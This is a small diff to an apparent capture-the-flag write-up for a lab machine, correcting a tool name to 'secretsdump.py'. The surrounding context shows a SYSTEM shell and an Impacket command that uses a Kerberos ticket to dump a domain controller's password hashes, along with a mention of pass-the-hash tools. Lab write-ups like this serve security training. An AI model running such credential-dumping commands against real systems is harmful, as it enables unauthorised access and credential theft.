@@ -1019,7 +1019,7 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-- OR we can dump the hashes with `secretdump.py` and use one of the pass the hash tools.
+- OR we can dump the hashes with `secretsdump.py` and use one of the pass the hash tools.
 ```
 $ KRB5CCNAME=Administrator.ccache /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass dc.intelligence.htb -just-dc 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
